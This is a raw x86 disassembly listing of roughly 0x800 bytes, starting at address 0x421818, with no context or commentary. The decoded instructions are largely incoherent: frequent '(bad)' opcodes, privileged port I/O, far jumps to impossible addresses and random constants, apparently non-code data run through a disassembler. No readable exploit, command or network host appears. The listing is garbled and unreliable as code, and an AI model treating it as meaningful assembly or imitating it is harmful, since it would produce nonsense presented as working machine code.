  421818:	call   FWORD PTR [ebx-0x5c671260]
  42181e:	sbb    BYTE PTR [edi-0x68],bl
  421821:	jg     0x4217bc
  421823:	fnsave [esi]
  421825:	retf   
  421826:	pop    eax
  421827:	je     0x4217ce
  421829:	call   FWORD PTR [edi-0x20]
  42182c:	(bad)  
  42182d:	fscale 
  42182f:	mov    eax,0x5232347d
  421834:	mov    ds:0xe4b5daa1,eax
  421839:	scas   eax,DWORD PTR es:[edi]
  42183a:	jge    0x421819
  42183c:	lahf   
  42183d:	addr16 xor al,0xfa
  421840:	push   ss
  421841:	sub    eax,0xffb7ee5c
  421846:	pop    edi
  421847:	call   0xe4c4b94b
  42184c:	adc    eax,ebx
  42184e:	mov    ah,0x3b
  421850:	sti    
  421851:	add    al,0x44
  421853:	in     eax,dx
  421854:	push   cs
  421855:	les    edi,FWORD PTR [ebp+0x2e02e0c2]
  42185b:	sub    dl,ch
  42185d:	(bad)  
  42185e:	fild   WORD PTR [edx-0x10]
  421864:	fcmovnb st,st(2)
  421866:	xchg   ebx,eax
  421867:	or     DWORD PTR ds:0xd11a02f3,0x3c274cba
  421871:	scas   al,BYTE PTR es:[edi]
  421872:	add    DWORD PTR [eax-0x530e1bbe],edx
  421878:	les    esp,FWORD PTR [edi-0xf]
  42187b:	mov    al,ds:0xe2885334
  421880:	int    0xff
  421882:	jmp    FWORD PTR [edi]
  421884:	icebp  
  421885:	push   0x551b01b
  42188a:	pushf  
  42188b:	pop    esi
  42188c:	dec    esi
  42188d:	fs ins BYTE PTR es:[edi],dx
  42188f:	dec    ebp
  421890:	sbb    BYTE PTR [eax],dl
  421892:	inc    eax
  421893:	mov    esi,0x7e24e057
  421898:	mov    al,ds:0xeddabd00
  42189d:	call   DWORD PTR [edi-0x4ccb0902]
  4218a3:	arpl   WORD PTR [edx+0x22],sp
  4218a6:	in     al,0xc4
  4218a8:	adc    al,0xa9
  4218aa:	pop    eax
  4218ab:	cmp    BYTE PTR [ebp-0x44],0x29
  4218af:	and    BYTE PTR [edx+eiz*2],0x77
  4218b3:	or     eax,0x189c3cb4
  4218b8:	aad    0xff
  4218ba:	jmp    FWORD PTR [esi+0x34]
  4218bd:	add    al,0x12
  4218bf:	jmp    0x42190a
  4218c1:	mov    edi,0x5617e1b4
  4218c6:	loop   0x421922
  4218c8:	lock mov bl,0xf2
  4218cb:	fwait
  4218cc:	add    BYTE PTR [edi+0xb],ah
  4218cf:	mov    WORD PTR [esp+edi*1],ss
  4218d2:	mov    BYTE PTR [ebp-0x9],cl
  4218d5:	sub    bl,ch
  4218d7:	mov    BYTE PTR [edi+edi*2-0x5d],bl
  4218db:	cli    
  4218dc:	mov    ebx,0xeb07068b
  4218e1:	add    eax,0xeb5353eb
  4218e6:	aas    
  4218e7:	clc    
  4218e8:	jmp    0x42190e
  4218ea:	ret    
  4218eb:	jmp    0x421908
  4218ed:	jg     0x421898
  4218ef:	(bad)  
  4218f1:	mov    bl,BYTE PTR [ebp-0x9]
  4218f4:	jmp    0x421917
  4218f6:	bswap  ecx
  4218f8:	pop    ss
  4218f9:	inc    eax
  4218fa:	jmp    0x421934
  4218fc:	jne    0x421916
  4218fe:	pop    esi
  4218ff:	not    ebx
  421901:	jmp    0x4218e7
  421903:	pop    ebx
  421904:	jmp    0x4218c5
  421906:	inc    DWORD PTR [edx+0x44]
  421909:	push   cs
  42190a:	jmp    0x4218ee
  42190c:	pop    ecx
  42190d:	jmp    0x42192f
  42190f:	pop    eax
  421910:	jmp    0x421908
  421912:	and    BYTE PTR [edx],ah
  421914:	loop   0x4218d5
  421916:	rcl    BYTE PTR [edx-0x1],0xcb
  42191a:	jmp    0x421906
  42191c:	rcl    edi,0x3d
  42191f:	jmp    0x421933
  421921:	cli    
  421922:	jmp    0x42199b
  421924:	jmp    0x4218e5
  421926:	bsf    ebx,esi
  421929:	fnsave [esi-0x1911f5db]
  42192f:	in     al,dx
  421930:	pop    ds
  421931:	push   cs
  421932:	add    al,cl
  421934:	inc    al
  421936:	test   eax,0xe71dbb76
  42193b:	xor    BYTE PTR [ebx],bh
  42193d:	mov    ebp,0x20783a50
  421942:	sbb    DWORD PTR [ebp+0x7402f11],0x38
  421949:	adc    BYTE PTR [ecx+0x49],bh
  42194c:	shl    BYTE PTR [eax],0x5b
  42194f:	cmp    BYTE PTR [ebp-0x7],dh
  421952:	inc    edx
  421953:	adc    DWORD PTR cs:[edi+0x38016c46],ebp
  42195a:	jl     0x4218fe
  42195c:	into   
  42195d:	inc    ebp
  42195e:	add    DWORD PTR [edi],ebp
  421960:	adc    ecx,DWORD PTR [eax-0x24576924]
  421966:	add    DWORD PTR [ebx+eax*1+0x14],eax
  42196a:	lea    edi,[eax]
  42196c:	or     eax,DWORD PTR [edi-0x1c]
  42196f:	pop    esp
  421970:	call   0x4c4c:0x37cd74b
  421977:	mov    esp,0x9ac44f8c
  42197c:	retf   
  42197d:	in     eax,0xd2
  42197f:	xchg   esp,eax
  421980:	mov    al,0xd0
  421982:	scas   eax,DWORD PTR es:[edi]
  421983:	push   eax
  421984:	mov    cl,0x80
  421986:	push   eax
  421987:	jne    0x42196f
  421989:	rcr    BYTE PTR [edx+eiz*8-0x18],cl
  42198d:	mov    eax,0xe04374b9
  421992:	ja     0x421961
  421994:	lods   eax,DWORD PTR ds:[esi]
  421995:	fisttp DWORD PTR [edi]
  421997:	loopne 0x421a09
  421999:	adc    ebp,DWORD PTR [edi+eax*1]
  42199c:	loope  0x42199a
  42199e:	mov    al,0x3
  4219a0:	pusha  
  4219a1:	add    BYTE PTR [ecx],al
  4219a3:	dec    ebp
  4219a4:	xor    eax,0xa019cb97
  4219a9:	sbb    al,dh
  4219ab:	sbb    ch,BYTE PTR [esp+edi*1+0x77]
  4219af:	nop
  4219b0:	push   esp
  4219b1:	lea    edi,[ecx]
  4219b3:	push   edi
  4219b4:	jg     0x421a11
  4219b6:	jg     0x421a04
  4219b8:	jae    0x4219ce
  4219ba:	scas   al,BYTE PTR es:[edi]
  4219bb:	mov    BYTE PTR [ebx],ch
  4219bd:	cmp    DWORD PTR [eax+edi*4-0x4feca61c],0xcce58038
  4219c8:	sar    BYTE PTR [edx],1
  4219ca:	ds pop ebp
  4219cc:	stos   DWORD PTR es:[edi],eax
  4219cd:	or     DWORD PTR [eax-0x559d17c6],ebx
  4219d3:	or     DWORD PTR [edx+eax*1+0xe],ebx
  4219d7:	adc    eax,0x205c0e7c
  4219dc:	jl     0x421961
  4219de:	cdq    
  4219df:	push   0x68
  4219e1:	(bad)  
  4219e3:	out    dx,eax
  4219e4:	test   BYTE PTR [ecx],bl
  4219e6:	pusha  
  4219e7:	mov    ah,0x23
  4219e9:	into   
  4219ea:	not    DWORD PTR [eax]
  4219ec:	sub    BYTE PTR [eax+0x65],dh
  4219ef:	sahf   
  4219f0:	call   0xb3f0277
  4219f5:	pushf  
  4219f6:	xor    BYTE PTR [ecx+eiz*4],al
  4219f9:	cli    
  4219fa:	mov    DWORD PTR [eax-0x41c4fdbb],ecx
  421a00:	mov    cl,0x6d
  421a02:	pop    edx
  421a03:	ror    BYTE PTR [bp+di],1
  421a06:	cdq    
  421a07:	pop    ecx
  421a08:	pushf  
  421a09:	xor    edx,edx
  421a0b:	mov    eax,0x8f159a54
  421a10:	ret    0x8a6d
  421a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a14:	or     dl,BYTE PTR [edi+0x17]
  421a17:	enter  0x2bee,0x61
  421a1b:	inc    edi
  421a1c:	jl     0x421a5d
  421a1e:	pop    ebp
  421a1f:	enter  0xdc74,0x53
  421a23:	retf   
  421a24:	adc    DWORD PTR es:[ecx-0x3c4ab120],eax
  421a2b:	test   eax,0x528c37e8
  421a30:	stos   DWORD PTR es:[edi],eax
  421a31:	adc    DWORD PTR [ebx+edi*4-0x38],edi
  421a35:	repz mov ebp,0x38349494
  421a3b:	xor    BYTE PTR [ebx],dl
  421a3d:	mov    al,ds:0xf367beaa
  421a42:	mov    al,ds:0x438645c
  421a47:	inc    eax
  421a48:	sbb    DWORD PTR [eax],eax
  421a4a:	in     eax,0x49
  421a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a4d:	add    DWORD PTR [edx],edi
  421a4f:	inc    ebp
  421a50:	test   DWORD PTR [eax],eax
  421a52:	pop    es
  421a53:	or     BYTE PTR [eax+0x23],cl
  421a56:	jp     0x421a13
  421a58:	cld    
  421a59:	fs das 
  421a5b:	dec    ebx
  421a5c:	inc    esp
  421a5d:	push   ebx
  421a5e:	imul   eax,DWORD PTR [esi+0x71],0x68570373
  421a65:	push   ecx
  421a66:	out    0xec,eax
  421a68:	aaa    
  421a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a6a:	out    dx,eax
  421a6b:	aaa    
  421a6c:	inc    ebx
  421a6d:	push   esi
  421a6e:	or     eax,DWORD PTR [eax+ebp*8]
  421a71:	pop    es
  421a72:	or     al,0xe0
  421a74:	pop    ecx
  421a75:	dec    cx
  421a77:	imul   ecx,DWORD PTR [bp+0x65],0xf8d66d6d
  421a7f:	fs mov ebx,0x136542fb
  421a85:	inc    esp
  421a86:	pop    ecx
  421a87:	pop    edx
  421a88:	popa   
  421a89:	add    al,0x0
  421a8b:	pusha  
  421a8c:	pop    edi
  421a8d:	adc    eax,0x408d0211
  421a92:	sbb    edx,DWORD PTR [ebx]
  421a94:	test   dh,0x4f
  421a97:	xor    dl,BYTE PTR [ebx]
  421a99:	mov    eax,eax
  421a9b:	add    BYTE PTR [ebx],al
  421a9d:	and    edx,DWORD PTR [ebx]
  421a9f:	(bad)  
  421aa0:	jmp    FWORD PTR [edi]
  421aa2:	mov    bh,0x50
  421aa4:	das    
  421aa5:	adc    al,0xfc
  421aa7:	sbb    al,bl
  421aa9:	add    bl,cl
  421aab:	int3   
  421aac:	enter  0xd7c9,0xcf
  421ab0:	enter  0xcecd,0xdb
  421ab4:	fcomp  st(2)
  421ab6:	fxch   st(2)
  421ab8:	(bad)  
  421aba:	lds    ebp,FWORD PTR [eax-0x202100d0]
  421ac0:	loopne 0x421aa3
  421ac2:	jecxz  0x421ac4
  421ac4:	in     al,0xe5
  421ac6:	cld    
  421ac7:	sub    ebp,DWORD PTR [eax]
  421ac9:	adc    BYTE PTR [ebp+0x34f55243],dh
  421acf:	pop    ss
  421ad0:	in     al,0xdf
  421ad2:	ja     0x421af4
  421ad4:	gs mov eax,cr0
  421ad8:	popa   
  421ad9:	je     0x421afb
  421adb:	xor    BYTE PTR [edi],bl
  421add:	mov    al,ds:0x307ffc05
  421ae2:	xor    DWORD PTR [edx],esi
  421ae4:	xor    esi,DWORD PTR [esi*1+0x39383736]
  421aeb:	inc    ecx
  421aec:	inc    edx
  421aed:	inc    ebx
  421aee:	test   BYTE PTR [edi+ebp*8-0x72],ch
  421af2:	dec    eax
  421af3:	icebp  
  421af4:	xor    cl,BYTE PTR [ebx+0x1f]
  421af7:	add    BYTE PTR [eax+eax*1],bl
  421afa:	add    ebx,DWORD PTR [esi]
  421afc:	and    eax,0x99b09b0
  421b01:	sbb    eax,0x7b3dd417
  421b06:	xchg   ebp,eax
  421b07:	add    BYTE PTR [edx+0x14],bl
  421b0a:	pop    es
  421b0b:	popa   
  421b0c:	xor    al,0x3
  421b0e:	inc    eax
  421b0f:	sbb    esi,DWORD PTR [edx-0x7f3df4d4]
  421b15:	inc    eax
  421b16:	rol    BYTE PTR [ebx],0xa0
  421b19:	cmp    esi,esi
  421b1b:	sbb    edi,0x8c4d0d03
  421b21:	add    edx,DWORD PTR [ebp+ecx*1+0x2882325b]
  421b28:	xchg   ebx,eax
  421b29:	or     cl,BYTE PTR [ebx+0x3f]
  421b2c:	dec    ebx
  421b2d:	cmp    BYTE PTR [eax],ah
  421b2f:	xor    dh,BYTE PTR [ebx+0x7cd3265d]
  421b35:	or     esi,esp
  421b37:	add    eax,0xe72a2e25
  421b3c:	dec    esi
  421b3d:	add    ebp,DWORD PTR [esp+esi*2+0x4d]
  421b41:	shl    DWORD PTR [ecx*2-0x6b737b84],cl
  421b48:	pushf  
  421b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b4a:	xor    al,0x4d
  421b4c:	shl    DWORD PTR [esp+ebp*4],cl
  421b4f:	mov    ah,0xbc
  421b51:	(bad)  
  421b52:	int3   
  421b53:	shl    DWORD PTR [ecx*2-0x1b232b2d],cl
  421b5a:	in     al,dx
  421b5b:	hlt    
  421b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b5d:	imul   ebx,DWORD PTR [edx+0x44ffc4b],0x9a1c140c
  421b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b68:	imul   ebx,DWORD PTR [edx+0x3c342c24],0x9a694c44
  421b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b73:	imul   edx,DWORD PTR [esp+ebx*2+0x64],0xf7bd746c
  421b7b:	call   0xc7:0x8c847ca6
  421b82:	retf   
  421b83:	push   esp
  421b84:	or     DWORD PTR [edx+esi*8],0x7
  421b88:	add    al,0x5
  421b8a:	fs pop ebx
  421b8c:	jb     0x421c00
  421b8e:	adc    dl,bh
  421b90:	gs push 0x7
  421b93:	cmp    esp,DWORD PTR [edi]
  421b95:	iret   
  421b96:	push   es
  421b97:	clc    
  421b98:	inc    edx
  421b99:	push   ebx
  421b9a:	push   eax
  421b9b:	push   esp
  421b9c:	pop    es
  421b9d:	cmp    DWORD PTR [ecx+ebx*1],0xffffffe4
  421ba1:	pop    esp
  421ba2:	mov    ah,0x55
  421ba4:	or     al,0xc0
  421ba6:	repnz fs nop
  421ba9:	daa    
  421baa:	push   esi
  421bab:	js     0x421b85
  421bad:	push   edi
  421bae:	mov    WORD PTR [edi],ss
  421bb0:	and    DWORD PTR [ebx+0x58e4300c],eax
  421bb6:	xchg   ecx,eax
  421bb7:	and    eax,DWORD PTR [edi-0x5e]
  421bba:	inc    eax
  421bbb:	jbe    0x421c0e
  421bbd:	call   0xaadb181a
  421bc2:	into   
  421bc3:	int    0x59
  421bc5:	mov    al,0xc1
  421bc7:	push   ds
  421bc8:	pop    ecx
  421bc9:	ds dec ecx
  421bcb:	shl    DWORD PTR [eax],0x22
  421bce:	ret    
  421bcf:	fbld   TBYTE PTR [edi]
  421bd1:	dec    ebp
  421bd2:	shl    DWORD PTR [edi+esi*4+0x8],cl
  421bd6:	fiadd  DWORD PTR [ebx+eax*1]
  421bd9:	adc    al,0x24
  421bdb:	cmp    BYTE PTR [eax+0x34],cl
  421bde:	dec    ebp
  421bdf:	shl    DWORD PTR [eax+ebx*2],cl
  421be2:	push   0xd29c8c7c
  421be7:	xor    al,0x4d
  421be9:	shl    DWORD PTR [eax-0xf1f2f40],cl
  421bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf0:	imul   ebx,DWORD PTR [edx+0xc00dbe6],0xc6403020
  421bfa:	sahf   
  421bfb:	jecxz  0x421bb2
  421bfd:	push   esp
  421bfe:	add    DWORD PTR fs:0xc8b0a03,ebp
  421c05:	and    bl,dl
  421c07:	in     eax,dx
  421c08:	aaa    
  421c09:	loop   0x421c47
  421c0b:	add    ecx,DWORD PTR [ebx+edi*2+0x19]
  421c0f:	mov    edi,0x61252c50
  421c14:	push   0x9e616d6f
  421c19:	sbb    al,0xf9
  421c1b:	in     al,dx
  421c1c:	inc    ebx
  421c1d:	add    DWORD PTR [ebx],ebx
  421c1f:	mov    BYTE PTR [eax-0x7fff67f9],al
  421c25:	lods   al,BYTE PTR ds:[esi]
  421c26:	cmp    BYTE PTR [edx+esi*8-0x15],0x98
  421c2b:	xor    eax,DWORD PTR [eax-0x237f33f9]
  421c31:	add    BYTE PTR [eax-0x71bb955a],al
  421c37:	lock and BYTE PTR [edx],0x77
  421c3b:	jb     0x421c21
  421c3d:	iret   
  421c3e:	jne    0x421c47
  421c40:	adc    ah,ch
  421c42:	pop    es
  421c43:	and    al,0x0
  421c45:	push   DWORD PTR [edi+edi*8]
  421c48:	repnz leave 
  421c4a:	scas   eax,DWORD PTR es:[edi]
  421c4b:	arpl   WORD PTR [edi],bp
  421c4d:	inc    DWORD PTR [edi]
  421c4f:	pop    eax
  421c50:	jmp    FWORD PTR [eax+0x0]
  421c53:	call   FWORD PTR [edi+0x7c393f3f]
  421c59:	dec    DWORD PTR [eax+eax*8-0x59633f24]
  421c60:	retf   0xb4f0
  421c63:	jmp    FWORD PTR [esi-0x11]
  421c66:	repz xchg ecx,eax
  421c68:	sti    
  421c69:	enter  0xa0a0,0xa4
  421c6d:	fmul   DWORD PTR [edx]
  421c6f:	inc    eax
  421c70:	pop    es
  421c71:	in     al,dx
  421c72:	add    ah,ah
  421c74:	leave  
  421c75:	xchg   ebx,eax
  421c76:	inc    edi
  421c77:	sbb    eax,0x11c0c04
  421c7c:	xor    al,0xf
  421c7e:	sahf   
  421c7f:	cmp    al,0x79
  421c81:	repnz dec esp
  421c83:	adc    al,0x60
  421c85:	adc    BYTE PTR [eax+0x12],bh
  421c88:	mov    WORD PTR [ecx],cs
  421c8a:	cmp    eax,0x574c7dd9
  421c8f:	and    BYTE PTR [edi],cl
  421c91:	mov    eax,0xc91ccc1b
  421c96:	xchg   ebx,eax
  421c97:	inc    edi
  421c98:	sahf   
  421c99:	pop    es
  421c9a:	in     al,dx
  421c9b:	adc    DWORD PTR [esi],ebx
  421c9d:	adc    BYTE PTR ds:0x793c0e24,cl
  421ca3:	repnz in al,0x38
  421ca6:	sbb    dl,BYTE PTR [eax+0xb]
  421ca9:	add    eax,DWORD PTR fs:[eax+0x4f279313]
  421cb0:	sahf   
  421cb1:	pushf  
  421cb2:	sbb    BYTE PTR [edi+edx*1+0x793b04d0],bh
  421cb9:	in     al,0xc9
  421cbb:	in     al,0x1e
  421cbd:	hlt    
  421cbe:	sbb    eax,0x2007081f
  421cc3:	out    dx,eax
  421cc4:	repnz in al,dx
  421cc6:	leave  
  421cc7:	scas   al,BYTE PTR es:[edi]
  421cc8:	pop    ds
  421cc9:	sysenter 
  421ccb:	add    BYTE PTR [ebp+edx*1+0x7],al
  421ccf:	pop    eax
  421cd0:	push   ss
  421cd1:	dec    esp
  421cd2:	sahf   
  421cd3:	cmp    al,0x79
  421cd5:	jo     0x421cdc
  421cd7:	test   BYTE PTR [esi],al
  421cd9:	cwde   
  421cda:	or     BYTE PTR [edi],ah
  421cdc:	(bad)  
  421cdd:	in     al,dx
  421cde:	bound  esp,QWORD PTR [edi+0x7]
  421ce1:	clc    
  421ce2:	add    DWORD PTR [eax],esp
  421ce4:	adc    BYTE PTR [edx],al
  421ce6:	sub    dl,dh
  421ce8:	in     al,0xc9
  421cea:	xchg   ebx,eax
  421ceb:	dec    ebp
  421cec:	inc    eax
  421ced:	adc    BYTE PTR [ecx+eax*4+0x70],0x82
  421cf2:	dec    edi
  421cf3:	sahf   
  421cf4:	cmp    al,0x79
  421cf6:	mov    BYTE PTR [esi-0x5e477760],al
  421cfc:	aam    0xa2
  421cfe:	repnz in al,0x91
  421d01:	daa    
  421d02:	in     al,dx
  421d03:	mov    cl,0x21
  421d05:	add    al,0xb2
  421d07:	sbb    al,0xba
  421d09:	dec    edi
  421d0a:	sahf   
  421d0b:	cmp    al,0x79
  421d0d:	xor    al,0xcc
  421d0f:	dec    esp
  421d10:	fisub  WORD PTR [esi+ebp*8+0x7c]
  421d14:	dec    DWORD PTR [ebp+0x4d]
  421d17:	pop    ds
  421d18:	daa    
  421d19:	cwde   
  421d1a:	jae    0x421d1e
  421d1c:	fld    DWORD PTR [ecx*8+0x342dd706]
  421d23:	add    ebp,DWORD PTR [ebx]
  421d25:	or     eax,0xd090b71
  421d2a:	adc    DWORD PTR [edx-0x3f],ebx
  421d2d:	jne    0x421d8c
  421d2f:	push   cs
  421d30:	adc    ecx,DWORD PTR [ebx+ebx*1]
  421d33:	mov    edi,db6
  421d36:	sar    ebx,0x5e
  421d39:	retf   0xfbd8
  421d3c:	or     ch,BYTE PTR [edx-0x51]
  421d3f:	add    al,0x80
  421d41:	or     BYTE PTR ds:0x105ef1e,bh
  421d47:	or     al,0x4f
  421d49:	dec    ebx
  421d4a:	icebp  
  421d4b:	pop    esi
  421d4c:	mov    al,0xef
  421d4e:	addr16 add al,0xff
  421d51:	or     BYTE PTR [ecx],al
  421d53:	or     al,0x9a
  421d55:	(bad)  [ebx-0x6bd1d062]
  421d5b:	out    0x4d,eax
  421d5d:	pushf  
  421d5e:	pop    es
  421d5f:	loope  0x421d15
  421d61:	in     al,0xaf
  421d63:	sar    DWORD PTR [edx-0x4a],0xc3
  421d67:	dec    esp
  421d68:	int3   
  421d69:	mov    bh,0x74
  421d6b:	not    DWORD PTR [edi-0x62fbae13]
  421d71:	pop    es
  421d72:	sbb    al,0x40
  421d74:	adc    BYTE PTR [eax],cl
  421d76:	int3   
  421d77:	jmp    0x1faf:0x80f935e
  421d7e:	cmp    al,BYTE PTR [edi]
  421d80:	add    al,0xdd
  421d82:	adc    al,0x37
  421d84:	hlt    
  421d85:	mov    edx,0x9ae7fc3b
  421d8a:	outs   dx,BYTE PTR ds:[esi]
  421d8b:	mov    al,0xc3
  421d8d:	inc    esp
  421d8e:	daa    
  421d8f:	ins    BYTE PTR es:[edi],dx
  421d90:	sbb    al,0x13
  421d92:	dec    ebx
  421d93:	sbb    eax,0x4d5dba68
  421d98:	daa    
  421d99:	dec    esp
  421d9a:	les    ebp,FWORD PTR [ebx]
  421d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d9d:	add    al,0x8f
  421d9f:	jbe    0x421da8
  421da1:	dec    esp
  421da2:	shl    DWORD PTR [edi+0x44],cl
  421da5:	cld    
  421da6:	push   ebx
  421da7:	aas    
  421da8:	push   edx
  421da9:	adc    al,0x5d
  421dab:	ja     0x421d4d
  421dad:	jmp    0x4f4e31e5
  421db2:	pop    es
  421db3:	add    al,0x3
  421db5:	adc    BYTE PTR [edx+0x1b01b027],bh
  421dbb:	xor    al,0x3b
  421dbd:	dec    ebp
  421dbe:	add    ebx,DWORD PTR fs:[edi+esi*8-0x24]
  421dc3:	adc    ebp,DWORD PTR [eax+0x6c]
  421dc6:	das    
  421dc7:	dec    esp
  421dc8:	aam    0xb
  421dca:	pop    ss
  421dcb:	ret    
  421dcc:	out    dx,al
  421dcd:	or     DWORD PTR [ebx*2-0x23b2401f],edi
  421dd4:	xchg   ebx,eax
  421dd5:	loope  0x421dc3
  421dd7:	add    ecx,esp
  421dd9:	out    0x80,eax
  421ddb:	add    edx,DWORD PTR [edi-0x14131c8d]
  421de1:	sahf   
  421de2:	cmp    eax,DWORD PTR [ebx+eiz*4]
  421de5:	cld    
  421de6:	stos   DWORD PTR es:[edi],eax
  421de7:	pop    ds
  421de8:	jae    0x421e2a
  421dea:	imul   ebx,DWORD PTR [esi+0x4daf03c0],0x27
  421df1:	rep lods al,BYTE PTR ds:[esi]
  421df3:	xchg   ebx,eax
  421df4:	loope  0x421dba
  421df6:	cmp    BYTE PTR [ecx-0x60],ch
  421df9:	jmp    0xd3771259
  421dfe:	or     al,0x4d
  421e00:	fld    QWORD PTR [ecx+0x4da7106f]
  421e06:	pop    ds
  421e07:	mov    esp,0x74209bc7
  421e0c:	dec    ebp
  421e0d:	xlat   BYTE PTR ds:[ebx]
  421e0e:	je     0x421e2b
  421e10:	xor    al,0xec
  421e12:	inc    edi
  421e13:	adc    al,0xac
  421e15:	or     edx,DWORD PTR [eax+eiz*8+0x7b]
  421e19:	jo     0x421ddb
  421e1b:	out    0x3b,eax
  421e1d:	mov    ds:0x6e7beec,eax
  421e22:	jmp    0x336e422e
  421e27:	inc    edi
  421e28:	xor    edi,DWORD PTR [esi+edi*1-0x7c166090]
  421e2f:	lock xchg ebx,eax
  421e31:	dec    esp
  421e32:	or     ebx,DWORD PTR [ebx-0x6c]
  421e35:	into   
  421e36:	loopne 0x421df8
  421e38:	imul   edi,DWORD PTR [ebx+esi*8],0x3b33e183
  421e3f:	mov    bl,0xeb
  421e41:	scas   eax,DWORD PTR es:[edi]
  421e42:	dec    esp
  421e43:	add    ecx,DWORD PTR [ebp+0x74]
  421e46:	arpl   WORD PTR [esi+0x4],cx
  421e49:	xchg   ebx,eax
  421e4a:	inc    ebx
  421e4b:	addr16 mov edx,0x24413fdd
  421e51:	subps  xmm0,XMMWORD PTR [edi]
  421e54:	loope  0x421e09
  421e56:	mov    edx,0x64dd7077
  421e5b:	jnp    0x421e75
  421e5d:	bswap  edi
  421e5f:	stos   DWORD PTR es:[edi],eax
  421e60:	(bad)  
  421e61:	dec    ebp
  421e62:	add    BYTE PTR [edi],cl
  421e64:	scas   al,BYTE PTR es:[edi]
  421e65:	sti    
  421e66:	jmp    FWORD PTR [edi+ebx*2-0x7398f4c8]
  421e6d:	add    al,0x52
  421e6f:	inc    ebp
  421e70:	test   BYTE PTR [ecx-0x7774da9f],bh
  421e76:	add    BYTE PTR [eax],cl
  421e78:	adc    DWORD PTR fs:[eax+0x2e],eax
  421e7c:	fild   WORD PTR [ecx]
  421e7e:	add    BYTE PTR [ecx],0x70
  421e81:	add    ecx,DWORD PTR [eax+eax*2]
  421e84:	cwde   
  421e85:	adc    eax,0x805c4604
  421e8a:	adc    BYTE PTR [ecx+0x55b2aa04],dl
  421e90:	add    BYTE PTR [eax+eax*1],ch
  421e93:	adc    BYTE PTR [ecx+0x2887ff03],al
  421e99:	sub    al,BYTE PTR [esi]
  421e9b:	add    BYTE PTR [eax+eax*1+0x56],al
  421e9f:	add    BYTE PTR [ebx+0x0],al
  421ea2:	dec    esp
  421ea3:	add    BYTE PTR [edi-0x4d],bh
  421ea6:	mov    ecx,0xb419b
  421eab:	push   eax
  421eac:	pop    es
  421ead:	or     eax,0x4500474b
  421eb2:	add    BYTE PTR [ecx+0x0],cl
  421eb5:	dec    esi
  421eb6:	retf   0x42d4
  421eb9:	push   ebp
  421eba:	and    al,0x4f
  421ebc:	fucomi st,st(5)
  421ebe:	mov    edi,0xf097237d
  421ec3:	push   ecx
  421ec4:	add    BYTE PTR [eax+0x22],al
  421ec7:	push   ss
  421ec8:	pop    edi
  421ec9:	add    BYTE PTR [ebx+0x27ea005b],ch
  421ecf:	or     edi,edi
  421ed1:	(bad)  
  421ed2:	(bad)  
  421ed3:	call   DWORD PTR [ebx+0x0]
  421ed6:	mov    DWORD PTR [eax+0x0],esi
  421ed9:	hlt    
  421eda:	test   al,0x0
  421edc:	pop    esp
  421edd:	fwait
  421ede:	add    BYTE PTR [esp+esi*2+0xa0a700],al
  421ee5:	cwde   
  421ee6:	ret    
  421ee7:	add    ah,bh
  421ee9:	cmp    eax,DWORD PTR [eax]
  421eeb:	fs xchg ebx,eax
  421eed:	add    BYTE PTR [eax+ebx*4+0xadbd00],cl
  421ef4:	(bad)  
  421ef5:	(bad)  
  421ef6:	(bad)  
  421ef7:	jmp    DWORD PTR [eax-0x6a]
  421efa:	add    BYTE PTR [ecx-0x206cff10],al
  421f00:	add    BYTE PTR [ebx],ch
  421f02:	iret   
  421f03:	add    dl,bh
  421f05:	jne    0x421f07
  421f07:	in     eax,dx
  421f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f09:	add    bl,dh
  421f0b:	aas    
  421f0c:	add    BYTE PTR [esi+ebp*8],ah
  421f0f:	add    BYTE PTR [ecx-0x26],bl
  421f12:	add    BYTE PTR [ebx+0x21530007],bh
  421f18:	std    
  421f19:	push   esi
  421f1b:	inc    DWORD PTR [eax]
  421f1d:	daa    
  421f1e:	or     BYTE PTR [eax],al
  421f20:	cmc    
  421f21:	test   DWORD PTR [eax],0xb000dd6f
  421f27:	mov    eax,DWORD PTR [edi+0x54]
  421f2a:	add    BYTE PTR [edi],bl
  421f2c:	xchg   ebp,eax
  421f2d:	add    BYTE PTR [eax-0x4d],bh
  421f30:	add    BYTE PTR [eax+ebx*8-0x622300],bh
  421f37:	fistp  QWORD PTR [esi+0x8f4abd]
  421f3d:	(bad)  [edx+0x7]
  421f40:	adc    BYTE PTR [eax],al
  421f42:	mov    BYTE PTR [esi],ah
  421f44:	leave  
  421f45:	cmp    BYTE PTR [eax],al
  421f47:	cmp    eax,DWORD PTR [edi+0x6bd300]
  421f4d:	shl    DWORD PTR [eax+eax*1-0x24048949],1
  421f54:	push   DWORD PTR ds:0x3300e777
  421f5a:	jg     0x421f5c
  421f5c:	mov    edi,0x5f1e8462
  421f61:	sahf   
  421f62:	push   ds
  421f63:	pop    ecx
  421f64:	mov    bh,0xff
  421f66:	out    dx,al
  421f67:	fild   DWORD PTR [eax]
  421f69:	xchg   edx,eax
  421f6a:	mov    al,ds:0x5b00d0b9
  421f6f:	pop    edi
  421f70:	rol    BYTE PTR [eax],0x74
  421f73:	sub    BYTE PTR [eax],al
  421f75:	fcomp  QWORD PTR [ebx]
  421f77:	add    BYTE PTR [esp+eax*2],cl
  421f7a:	scas   eax,DWORD PTR es:[edi]
  421f7b:	sub    eax,0xdb6fdb6f
  421f80:	add    al,ch
  421f82:	enter  0x41e9,0x1b
  421f86:	add    BYTE PTR [bp+di-0x1c3f],dh
  421f8b:	push   0x5f
  421f8d:	sbb    al,BYTE PTR [eax]
  421f8f:	movzx  ebx,ch
  421f92:	inc    eax
  421f93:	shr    BYTE PTR [ecx+0x0],0xe4
  421f97:	hlt    
  421f98:	add    BYTE PTR [esi],dh
  421f9a:	push   cs
  421f9b:	push   ds
  421f9c:	fdivp  st(7),st
  421f9e:	imul   ch
  421fa0:	in     eax,dx
  421fa1:	les    edi,FWORD PTR [edi+0x290057f1]
  421fa7:	jp     0x421ff7
  421fa9:	and    al,BYTE PTR [eax]
  421fab:	das    
  421fac:	xchg   ebp,eax
